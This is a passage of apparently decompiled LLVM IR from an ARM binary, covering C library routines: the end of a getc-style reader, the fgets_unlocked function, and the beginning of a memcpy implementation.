  store i32 %v0_17f18, i32* @r4, align 4
  br i1 %v3_17f20, label %bb, label %dec_label_pc_17f40

bb:                                               ; preds = %entry
  %v2_17f2c = inttoptr i32 %v3_17f18 to i8*
  %v3_17f2c = load i8, i8* %v2_17f2c, align 1
  %v4_17f2c = zext i8 %v3_17f2c to i32
  store i32 %v4_17f2c, i32* %r0.global-to-local, align 4
  %v6_17f2c = add i32 %v3_17f18, 1
  store i32 %v6_17f2c, i32* %r2.global-to-local, align 4
  store i32 %v6_17f2c, i32* %v2_17f18, align 4
  br label %dec_label_pc_1802c

dec_label_pc_17f40:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r5, align 4
  %v1_17f40 = inttoptr i32 %v0_17f18 to i16*
  %v2_17f40 = load i16, i16* %v1_17f40, align 2
  %v3_17f40 = zext i16 %v2_17f40 to i32
  %v1_17f44 = and i32 %v3_17f40, 131
  %tmp25 = icmp ugt i32 %v1_17f44, 128
  br i1 %tmp25, label %dec_label_pc_17f60, label %dec_label_pc_17f50

dec_label_pc_17f50:                               ; preds = %dec_label_pc_17f40
  store i32 128, i32* @r1, align 4
  %v0_17f54 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17f54, i32* %r0.global-to-local, align 4
  %v2_17f58 = icmp eq i32 %v0_17f54, 0
  br i1 %v2_17f58, label %dec_label_pc_17f50.dec_label_pc_17f60_crit_edge, label %dec_label_pc_18028

dec_label_pc_17f50.dec_label_pc_17f60_crit_edge:  ; preds = %dec_label_pc_17f50
  %v0_17f60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17f60

dec_label_pc_17f60:                               ; preds = %dec_label_pc_17f50.dec_label_pc_17f60_crit_edge, %dec_label_pc_17f40
  %v2_17fa0 = phi i32 [ %v0_17f60.pre, %dec_label_pc_17f50.dec_label_pc_17f60_crit_edge ], [ %v0_17f18, %dec_label_pc_17f40 ]
  %v1_17f60 = inttoptr i32 %v2_17fa0 to i16*
  %v2_17f60 = load i16, i16* %v1_17f60, align 2
  %v3_17f60 = zext i16 %v2_17f60 to i32
  store i32 %v3_17f60, i32* %r2.global-to-local, align 4
  %v1_17f64 = and i32 %v3_17f60, 2
  %v2_17f64 = icmp eq i32 %v1_17f64, 0
  br i1 %v2_17f64, label %dec_label_pc_17f90, label %dec_label_pc_17f6c

dec_label_pc_17f6c:                               ; preds = %dec_label_pc_17f60
  %tmp26 = urem i16 %v2_17f60, 2
  %v1_17f6c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_17f6c
  %v4_17f70 = and i32 %tmp22, 4
  %v5_17f70 = add i32 %v4_17f70, %v2_17fa0
  %v1_17f74 = add i32 %v5_17f70, 36
  %v2_17f74 = inttoptr i32 %v1_17f74 to i8*
  %v3_17f74 = load i8, i8* %v2_17f74, align 1
  %v4_17f74 = zext i8 %v3_17f74 to i32
  %v1_17f78 = add nsw i32 %v3_17f60, -1
  store i32 %v1_17f78, i32* %r2.global-to-local, align 4
  store i32 %v4_17f74, i32* %r0.global-to-local, align 4
  %v2_17f84 = add i32 %v2_17fa0, 40
  %v3_17f84 = inttoptr i32 %v2_17f84 to i32*
  store i32 0, i32* %v3_17f84, align 4
  %v0_17f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f88 = trunc i32 %v0_17f88 to i16
  %v2_17f88 = load i32, i32* @r4, align 4
  %v3_17f88 = inttoptr i32 %v2_17f88 to i16*
  store i16 %v1_17f88, i16* %v3_17f88, align 2
  br label %dec_label_pc_1802c

dec_label_pc_17f90:                               ; preds = %dec_label_pc_17f60
  %v1_17f90 = add i32 %v2_17fa0, 16
  %v1_17f94 = inttoptr i32 %v1_17f90 to i32*
  %v2_17f94 = load i32, i32* %v1_17f94, align 4
  store i32 %v2_17f94, i32* @r1, align 4
  %v3_17f94 = add i32 %v2_17fa0, 20
  %v4_17f94 = inttoptr i32 %v3_17f94 to i32*
  %v5_17f94 = load i32, i32* %v4_17f94, align 4
  %v9_17f98 = icmp eq i32 %v5_17f94, %v2_17f94
  br i1 %v9_17f98, label %dec_label_pc_17fa8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17f90
  %v2_17f9c = inttoptr i32 %v2_17f94 to i8*
  %v3_17f9c = load i8, i8* %v2_17f9c, align 1
  %v4_17f9c = zext i8 %v3_17f9c to i32
  store i32 %v4_17f9c, i32* %r0.global-to-local, align 4
  %v6_17f9c = add i32 %v2_17f94, 1
  store i32 %v6_17f9c, i32* @r1, align 4
  store i32 %v6_17f9c, i32* %v1_17f94, align 4
  br label %dec_label_pc_1802c

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f90
  %v1_17fa8 = add i32 %v2_17fa0, 4
  %v2_17fa8 = inttoptr i32 %v1_17fa8 to i32*
  %v3_17fa8 = load i32, i32* %v2_17fa8, align 4
  %v7_17fac = icmp eq i32 %v3_17fa8, -2
  br i1 %v7_17fac, label %.thread7, label %dec_label_pc_17fc0

.thread7:                                         ; preds = %dec_label_pc_17fa8
  %v2_17fb0 = or i16 %v2_17f60, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17fb0, i16* %v1_17f60, align 2
  br label %dec_label_pc_1802c

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fa8
  %v1_17fc0 = and i32 %v3_17f60, 768
  %v2_17fc0 = icmp eq i32 %v1_17fc0, 0
  br i1 %v2_17fc0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17fc0
  %v1_17fc8 = load i32, i32* @r5, align 4
  %v3_17fc8 = add i32 %v1_17fc8, 76
  %v4_17fc8 = inttoptr i32 %v3_17fc8 to i32*
  %v5_17fc8 = load i32, i32* %v4_17fc8, align 4
  store i32 %v5_17fc8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17fc0, %bb23
  store i32 98256, i32* @lr, align 4
  %v1_17fcc = xor i1 %v2_17fc0, true
  call void @__pseudo_cond_branch(i1 %v1_17fcc, i32 ptrtoint (i32* @global_var_17b68.615 to i32))
  %v0_17fd0 = load i32, i32* @r4, align 4
  %v1_17fd0 = add i32 %v0_17fd0, 8
  store i32 %v1_17fd0, i32* %r2.global-to-local, align 4
  %v1_17fd4 = inttoptr i32 %v1_17fd0 to i32*
  %v2_17fd4 = load i32, i32* %v1_17fd4, align 4
  store i32 %v2_17fd4, i32* %r2.global-to-local, align 4
  %v3_17fd4 = add i32 %v0_17fd0, 12
  %v4_17fd4 = inttoptr i32 %v3_17fd4 to i32*
  %v5_17fd4 = load i32, i32* %v4_17fd4, align 4
  %v9_17fd8 = icmp eq i32 %v5_17fd4, %v2_17fd4
  br i1 %v9_17fd8, label %dec_label_pc_1800c, label %dec_label_pc_17fe0

dec_label_pc_17fe0:                               ; preds = %.thread9
  %v2_17fe0 = add i32 %v0_17fd0, 24
  %v3_17fe0 = inttoptr i32 %v2_17fe0 to i32*
  store i32 %v2_17fd4, i32* %v3_17fe0, align 4
  %v0_17fe4 = load i32, i32* @r4, align 4
  store i32 %v0_17fe4, i32* %r0.global-to-local, align 4
  %v2_17fe8 = call i32 @__stdio_rfill(i32 %v0_17fe4)
  store i32 %v2_17fe8, i32* %r0.global-to-local, align 4
  %v2_17fec = icmp eq i32 %v2_17fe8, 0
  br i1 %v2_17fec, label %dec_label_pc_18028, label %dec_label_pc_17ff4

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17fe0
  %v0_17ff4 = load i32, i32* @r4, align 4
  %v1_17ff4 = add i32 %v0_17ff4, 20
  %v2_17ff4 = inttoptr i32 %v1_17ff4 to i32*
  %v3_17ff4 = load i32, i32* %v2_17ff4, align 4
  %v2_17ff8 = add i32 %v0_17ff4, 24
  %v3_17ff8 = inttoptr i32 %v2_17ff8 to i32*
  store i32 %v3_17ff4, i32* %v3_17ff8, align 4
  %v0_17ffc = load i32, i32* @r4, align 4
  %v1_17ffc = add i32 %v0_17ffc, 16
  %v2_17ffc = inttoptr i32 %v1_17ffc to i32*
  %v3_17ffc = load i32, i32* %v2_17ffc, align 4
  %v1_18000 = inttoptr i32 %v3_17ffc to i8*
  %v2_18000 = load i8, i8* %v1_18000, align 1
  %v3_18000 = zext i8 %v2_18000 to i32
  store i32 %v3_18000, i32* %r0.global-to-local, align 4
  %v5_18000 = add i32 %v3_17ffc, 1
  store i32 %v5_18000, i32* %v2_17ffc, align 4
  br label %dec_label_pc_1802c

dec_label_pc_1800c:                               ; preds = %.thread9
  %v1_1800c = inttoptr i32 %v0_17fd0 to i16*
  store i32 %v0_17fd0, i32* %r0.global-to-local, align 4
  %v2_18010 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_18010, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_18018 = call i32 @__stdio_READ(i16* %v1_1800c, i32 %v2_18010, i32 1)
  store i32 %v5_18018, i32* %r0.global-to-local, align 4
  %v2_1801c = icmp eq i32 %v5_18018, 0
  br i1 %v2_1801c, label %dec_label_pc_18028, label %bb24

bb24:                                             ; preds = %dec_label_pc_1800c
  %v4_18020 = load i8, i8* %stack_var_-17, align 1
  %v5_18020 = sext i8 %v4_18020 to i32
  store i32 %v5_18020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1802c

dec_label_pc_18028:                               ; preds = %dec_label_pc_1800c, %dec_label_pc_17f50, %dec_label_pc_17fe0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1802c

dec_label_pc_1802c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17ff4, %dec_label_pc_17f6c, %dec_label_pc_18028
  %v2_18030 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18030, i32* @r4, align 4
  store i32 %v6_17f14, i32* @r5, align 4
  store i32 %v9_17f14, i32* @lr, align 4
  %v1_18034 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18034

; uselistorder directives
  uselistorder i32 %v2_17f94, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17fa0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17f18, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 131, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_1802c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_18028, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_18040 = load i32, i32* @r6, align 4
  %v12_18040 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18044 = icmp eq i32 %arg2, 0
  store i1 %v2_18044, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_180cc, label %dec_label_pc_180b4.preheader

dec_label_pc_180b4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_180b42 = add i32 %arg2, -1
  store i32 %v1_180b42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_180b48 = icmp eq i32 %arg2, 1
  store i1 %v7_180b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180b48, label %dec_label_pc_180bc, label %dec_label_pc_18060

dec_label_pc_18060:                               ; preds = %dec_label_pc_180b4.preheader, %dec_label_pc_180b4.backedge.dec_label_pc_18060_crit_edge
  %v0_18084 = phi i32 [ %v0_18060.pre, %dec_label_pc_180b4.backedge.dec_label_pc_18060_crit_edge ], [ %arg3, %dec_label_pc_180b4.preheader ]
  %v1_18060 = add i32 %v0_18084, 16
  %v2_18060 = inttoptr i32 %v1_18060 to i32*
  %v3_18060 = load i32, i32* %v2_18060, align 4
  store i32 %v3_18060, i32* %r2.global-to-local, align 4
  %v1_18064 = add i32 %v0_18084, 24
  %v2_18064 = inttoptr i32 %v1_18064 to i32*
  %v3_18064 = load i32, i32* %v2_18064, align 4
  store i32 %v3_18064, i32* %r3.global-to-local, align 4
  %v3_18068 = icmp uge i32 %v3_18060, %v3_18064
  store i1 %v3_18068, i1* %cpsr_c.global-to-local, align 1
  %v9_18068 = icmp eq i32 %v3_18060, %v3_18064
  store i1 %v9_18068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18068, label %dec_label_pc_18084, label %dec_label_pc_18070

dec_label_pc_18070:                               ; preds = %dec_label_pc_18060
  %v1_18070 = inttoptr i32 %v3_18060 to i8*
  %v2_18070 = load i8, i8* %v1_18070, align 1
  %v3_18070 = zext i8 %v2_18070 to i32
  store i32 %v3_18070, i32* %r3.global-to-local, align 4
  %v5_18070 = add i32 %v3_18060, 1
  store i32 %v5_18070, i32* %r2.global-to-local, align 4
  %v2_18074 = load i32, i32* @r5, align 4
  %v3_18074 = inttoptr i32 %v2_18074 to i8*
  store i8 %v2_18070, i8* %v3_18074, align 1
  %v4_18074 = load i32, i32* @r5, align 4
  %v5_18074 = add i32 %v4_18074, 1
  store i32 %v5_18074, i32* @r5, align 4
  %v0_18078 = load i32, i32* %r3.global-to-local, align 4
  %v2_18078 = icmp ugt i32 %v0_18078, 9
  store i1 %v2_18078, i1* %cpsr_c.global-to-local, align 1
  %v7_18078 = icmp eq i32 %v0_18078, 10
  store i1 %v7_18078, i1* %cpsr_z.global-to-local, align 1
  %v0_1807c = load i32, i32* %r2.global-to-local, align 4
  %v1_1807c = load i32, i32* @r4, align 4
  %v2_1807c = add i32 %v1_1807c, 16
  %v3_1807c = inttoptr i32 %v2_1807c to i32*
  store i32 %v0_1807c, i32* %v3_1807c, align 4
  br i1 %v7_18078, label %dec_label_pc_180bc, label %dec_label_pc_180b4.backedge

dec_label_pc_18084:                               ; preds = %dec_label_pc_18060
  %v1_18084 = inttoptr i32 %v0_18084 to i16*
  %v3_18088 = call i32 @getc_unlocked(i16* %v1_18084)
  %v3_1808c = icmp eq i32 %v3_18088, -1
  store i1 %v3_1808c, i1* %cpsr_c.global-to-local, align 1
  %v8_1808c = icmp eq i32 %v3_18088, -1
  store i1 %v8_1808c, i1* %cpsr_z.global-to-local, align 1
  %v1_18090 = urem i32 %v3_18088, 256
  store i32 %v1_18090, i32* %r3.global-to-local, align 4
  br i1 %v3_1808c, label %dec_label_pc_18098, label %dec_label_pc_180b0

dec_label_pc_18098:                               ; preds = %dec_label_pc_18084
  %v0_18098 = load i32, i32* @r4, align 4
  %v1_18098 = inttoptr i32 %v0_18098 to i16*
  %v2_18098 = load i16, i16* %v1_18098, align 2
  %v3_18098 = zext i16 %v2_18098 to i32
  store i32 %v3_18098, i32* %r3.global-to-local, align 4
  %v1_1809c = and i32 %v3_18098, 8
  %v2_1809c = icmp eq i32 %v1_1809c, 0
  store i1 %v2_1809c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1809c, label %dec_label_pc_180bc, label %dec_label_pc_180cc

dec_label_pc_180b0:                               ; preds = %dec_label_pc_18084
  %v1_180a8 = trunc i32 %v3_18088 to i8
  %v2_180a8 = load i32, i32* @r5, align 4
  %v3_180a8 = inttoptr i32 %v2_180a8 to i8*
  store i8 %v1_180a8, i8* %v3_180a8, align 1
  %v4_180a8 = load i32, i32* @r5, align 4
  %v5_180a8 = add i32 %v4_180a8, 1
  store i32 %v5_180a8, i32* @r5, align 4
  %v0_180ac = load i32, i32* %r3.global-to-local, align 4
  %v2_180ac = icmp ugt i32 %v0_180ac, 9
  store i1 %v2_180ac, i1* %cpsr_c.global-to-local, align 1
  %v7_180ac = icmp eq i32 %v0_180ac, 10
  store i1 %v7_180ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180ac, label %dec_label_pc_180bc, label %dec_label_pc_180b4.backedge

dec_label_pc_180b4.backedge:                      ; preds = %dec_label_pc_180b0, %dec_label_pc_18070
  %v0_180b4 = load i32, i32* @r6, align 4
  %v1_180b4 = add i32 %v0_180b4, -1
  store i32 %v1_180b4, i32* @r6, align 4
  %v2_180b4 = icmp ne i32 %v0_180b4, 0
  store i1 %v2_180b4, i1* %cpsr_c.global-to-local, align 1
  %v7_180b4 = icmp eq i32 %v0_180b4, 1
  store i1 %v7_180b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180b4, label %dec_label_pc_180bc, label %dec_label_pc_180b4.backedge.dec_label_pc_18060_crit_edge

dec_label_pc_180b4.backedge.dec_label_pc_18060_crit_edge: ; preds = %dec_label_pc_180b4.backedge
  %v0_18060.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18060

dec_label_pc_180bc:                               ; preds = %dec_label_pc_180b0, %dec_label_pc_180b4.backedge, %dec_label_pc_18070, %dec_label_pc_180b4.preheader, %dec_label_pc_18098
  %v0_180bc = load i32, i32* @r5, align 4
  %v1_180bc = load i32, i32* @r7, align 4
  %v3_180bc = icmp uge i32 %v0_180bc, %v1_180bc
  store i1 %v3_180bc, i1* %cpsr_c.global-to-local, align 1
  %v9_180bc = icmp eq i32 %v0_180bc, %v1_180bc
  store i1 %v9_180bc, i1* %cpsr_z.global-to-local, align 1
  %v2_180c0 = xor i1 %v9_180bc, true
  %v3_180c0 = and i1 %v3_180bc, %v2_180c0
  br i1 %v3_180c0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_180bc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_180c4 = inttoptr i32 %v0_180bc to i8*
  store i8 0, i8* %v7_180c4, align 1
  %v0_180c8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_180c8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_180bc, %bb
  %v1_180c8 = phi i1 [ %v1_180c8.pre, %bb ], [ %v9_180bc, %dec_label_pc_180bc ]
  %v0_180c8 = phi i1 [ %v0_180c8.pre, %bb ], [ %v3_180bc, %dec_label_pc_180bc ]
  %v2_180c8 = xor i1 %v1_180c8, true
  %v3_180c8 = and i1 %v0_180c8, %v2_180c8
  br i1 %v3_180c8, label %.dec_label_pc_180d0_crit_edge, label %dec_label_pc_180cc

.dec_label_pc_180d0_crit_edge:                    ; preds = %.thread14
  %v0_180d0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_180d0

dec_label_pc_180cc:                               ; preds = %entry, %dec_label_pc_18098, %.thread14
  br label %dec_label_pc_180d0

dec_label_pc_180d0:                               ; preds = %.dec_label_pc_180d0_crit_edge, %dec_label_pc_180cc
  %v0_180d0 = phi i32 [ %v0_180d0.pre, %.dec_label_pc_180d0_crit_edge ], [ 0, %dec_label_pc_180cc ]
  store i32 %v9_18040, i32* @r6, align 4
  store i32 %v12_18040, i32* @r7, align 4
  ret i32 %v0_180d0

; uselistorder directives
  uselistorder i1 %v9_180bc, { 1, 0, 2 }
  uselistorder i32 %v1_180bc, { 1, 0 }
  uselistorder i32 %v0_180bc, { 0, 2, 1 }
  uselistorder i32 %v0_180b4, { 2, 0, 1 }
  uselistorder i32 %v0_180ac, { 1, 0 }
  uselistorder i32 %v3_18088, { 2, 1, 0, 3 }
  uselistorder i32 %v0_18078, { 1, 0 }
  uselistorder i32 %v3_18060, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_18084, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_180d0, { 1, 0 }
  uselistorder label %dec_label_pc_180cc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_180bc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_18060, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_180e0 = load i32, i32* @r1, align 4
  %v1_180e0 = load i32, i32* @r0, align 4
  %v2_180e0 = sub i32 %v0_180e0, %v1_180e0
  %v3_180e0 = icmp ult i32 %v0_180e0, %v1_180e0
  %v4_180e0 = xor i32 %v1_180e0, %v0_180e0
  %v5_180e0 = xor i32 %v2_180e0, %v0_180e0
  %v6_180e0 = and i32 %v5_180e0, %v4_180e0
  %v7_180e0 = icmp slt i32 %v6_180e0, 0
  store i1 %v7_180e0, i1* %cpsr_v.global-to-local, align 1
  %v8_180e0 = icmp slt i32 %v2_180e0, 0
  store i1 %v8_180e0, i1* %cpsr_n.global-to-local, align 1
  %v9_180e0 = icmp eq i32 %v0_180e0, %v1_180e0
  store i1 %v9_180e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_180e0, label %dec_label_pc_18334, label %dec_label_pc_180e8

dec_label_pc_180e8:                               ; preds = %entry
  br i1 %v9_180e0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_180e8
  %merge = phi i32 [ %v0_180e0, %dec_label_pc_180e8 ], [ %v2_183c8, %bb150 ], [ %v11_183e4, %bb153 ], [ %v7_183e4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_180e8
  %v5_180ec = inttoptr i32 %v1_180e0 to i8*
  store i8* %v5_180ec, i8** %stack_var_-8, align 4
  %v8_180ec = load i32, i32* @lr, align 4
  %v0_180f0 = load i32, i32* @r2, align 4
  %v2_180f0 = add i32 %v0_180f0, -4
  store i32 %v2_180f0, i32* %r2.global-to-local, align 4
  %v4_180f0 = sub i32 3, %v0_180f0
  %v5_180f0 = and i32 %v4_180f0, %v0_180f0
  %v6_180f0 = icmp slt i32 %v5_180f0, 0
  store i1 %v6_180f0, i1* %cpsr_v.global-to-local, align 1
  %v7_180f0 = icmp slt i32 %v2_180f0, 0
  store i1 %v7_180f0, i1* %cpsr_n.global-to-local, align 1
  %v8_180f0 = icmp eq i32 %v0_180f0, 4
  store i1 %v8_180f0, i1* %cpsr_z.global-to-local, align 1
  %v5_180f4 = icmp slt i32 %v0_180f0, 4
  br i1 %v5_180f4, label %bb140, label %dec_label_pc_180f8

dec_label_pc_180f8:                               ; preds = %bb
  %v1_180f8 = urem i32 %v1_180e0, 4
  store i32 %v1_180f8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_180f8 = icmp eq i32 %v1_180f8, 0
  store i1 %v2_180f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_180f8, label %dec_label_pc_18100, label %dec_label_pc_181ac

dec_label_pc_18100:                               ; preds = %dec_label_pc_180f8
  %v1_18100 = urem i32 %v0_180e0, 4
  store i32 %v1_18100, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18100 = icmp eq i32 %v1_18100, 0
  store i1 %v2_18100, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_180e0 to i2
  br i1 %v2_18100, label %dec_label_pc_18108, label %dec_label_pc_181dc

dec_label_pc_18108:                               ; preds = %dec_label_pc_18100, %dec_label_pc_181d4
  %v0_1812094 = phi i32 [ %v1_180e0, %dec_label_pc_18100 ], [ %v0_182fc77, %dec_label_pc_181d4 ]
  %v0_1811c93 = phi i32 [ %v0_180e0, %dec_label_pc_18100 ], [ %v0_181d4, %dec_label_pc_181d4 ]
  %v0_18108 = phi i32 [ %v2_180f0, %dec_label_pc_18100 ], [ %v2_181cc, %dec_label_pc_181d4 ]
  %v1_18108 = add i32 %v0_18108, -8
  store i32 %v1_18108, i32* %r2.global-to-local, align 4
  %v3_18108 = sub i32 7, %v0_18108
  %v4_18108 = and i32 %v3_18108, %v0_18108
  %v5_18108 = icmp slt i32 %v4_18108, 0
  store i1 %v5_18108, i1* %cpsr_v.global-to-local, align 1
  %v6_18108 = icmp slt i32 %v1_18108, 0
  store i1 %v6_18108, i1* %cpsr_n.global-to-local, align 1
  %v7_18108 = icmp eq i32 %v0_18108, 8
  store i1 %v7_18108, i1* %cpsr_z.global-to-local, align 1
  %v2_1810c = xor i1 %v6_18108, %v5_18108
  br i1 %v2_1810c, label %dec_label_pc_1815c, label %dec_label_pc_18110

dec_label_pc_18110:                               ; preds = %dec_label_pc_18108
  %v1_18110 = add i32 %v0_18108, -28
  store i32 %v1_18110, i32* %r2.global-to-local, align 4
  %v3_18110 = sub i32 27, %v0_18108
  %v4_18110 = and i32 %v3_18110, %v1_18108
  %v5_18110 = icmp slt i32 %v4_18110, 0
  store i1 %v5_18110, i1* %cpsr_v.global-to-local, align 1
  %v6_18110 = icmp slt i32 %v1_18110, 0
  store i1 %v6_18110, i1* %cpsr_n.global-to-local, align 1
  %v7_18110 = icmp eq i32 %v1_18108, 20
  store i1 %v7_18110, i1* %cpsr_z.global-to-local, align 1
  %v2_18114 = xor i1 %v6_18110, %v5_18110
  br i1 %v2_18114, label %dec_label_pc_18148, label %dec_label_pc_18118

dec_label_pc_18118:                               ; preds = %dec_label_pc_18110
  %v0_18118 = load i32, i32* @r4, align 4
  store i32 %v0_18118, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1811c

dec_label_pc_1811c:                               ; preds = %dec_label_pc_1811c.dec_label_pc_1811c_crit_edge, %dec_label_pc_18118
  %v0_18120 = phi i32 [ %v12_18128, %dec_label_pc_1811c.dec_label_pc_1811c_crit_edge ], [ %v0_1812094, %dec_label_pc_18118 ]
  %v0_1811c = phi i32 [ %v0_1811c.pre, %dec_label_pc_1811c.dec_label_pc_1811c_crit_edge ], [ %v0_1811c93, %dec_label_pc_18118 ]
  %v1_1811c = inttoptr i32 %v0_1811c to i32*
  %v2_1811c = load i32, i32* %v1_1811c, align 4
  %v3_1811c = add i32 %v0_1811c, 4
  %v4_1811c = inttoptr i32 %v3_1811c to i32*
  %v5_1811c = load i32, i32* %v4_1811c, align 4
  store i32 %v5_1811c, i32* %r4.global-to-local, align 4
  %v6_1811c = add i32 %v0_1811c, 8
  %v7_1811c = inttoptr i32 %v6_1811c to i32*
  %v8_1811c = load i32, i32* %v7_1811c, align 4
  store i32 %v8_1811c, i32* %ip.global-to-local, align 4
  %v9_1811c = add i32 %v0_1811c, 12
  %v10_1811c = inttoptr i32 %v9_1811c to i32*
  %v11_1811c = load i32, i32* %v10_1811c, align 4
  store i32 %v11_1811c, i32* %lr.global-to-local, align 4
  %v12_1811c = add i32 %v0_1811c, 16
  store i32 %v12_1811c, i32* %r1.global-to-local, align 4
  %v1_18120 = inttoptr i32 %v0_18120 to i32*
  store i32 %v2_1811c, i32* %v1_18120, align 4
  %v3_18120 = add i32 %v0_18120, 4
  %v4_18120 = inttoptr i32 %v3_18120 to i32*
  %v5_18120 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18120, i32* %v4_18120, align 4
  %v6_18120 = add i32 %v0_18120, 8
  %v7_18120 = inttoptr i32 %v6_18120 to i32*
  %v8_18120 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18120, i32* %v7_18120, align 4
  %v9_18120 = add i32 %v0_18120, 12
  %v10_18120 = inttoptr i32 %v9_18120 to i32*
  %v11_18120 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18120, i32* %v10_18120, align 4
  %v12_18120 = add i32 %v0_18120, 16
  store i32 %v12_18120, i32* %r0.global-to-local, align 4
  %v0_18124 = load i32, i32* %r1.global-to-local, align 4
  %v1_18124 = inttoptr i32 %v0_18124 to i32*
  %v2_18124 = load i32, i32* %v1_18124, align 4
  store i32 %v2_18124, i32* @r3, align 4
  %v3_18124 = add i32 %v0_18124, 4
  %v4_18124 = inttoptr i32 %v3_18124 to i32*
  %v5_18124 = load i32, i32* %v4_18124, align 4
  store i32 %v5_18124, i32* %r4.global-to-local, align 4
  %v6_18124 = add i32 %v0_18124, 8
  %v7_18124 = inttoptr i32 %v6_18124 to i32*
  %v8_18124 = load i32, i32* %v7_18124, align 4
  store i32 %v8_18124, i32* @ip, align 4
  %v9_18124 = add i32 %v0_18124, 12
  %v10_18124 = inttoptr i32 %v9_18124 to i32*
  %v11_18124 = load i32, i32* %v10_18124, align 4
  store i32 %v11_18124, i32* %lr.global-to-local, align 4
  %v12_18124 = add i32 %v0_18124, 16
  store i32 %v12_18124, i32* @r1, align 4
  %v1_18128 = inttoptr i32 %v12_18120 to i32*
  store i32 %v2_18124, i32* %v1_18128, align 4
  %v3_18128 = add i32 %v0_18120, 20
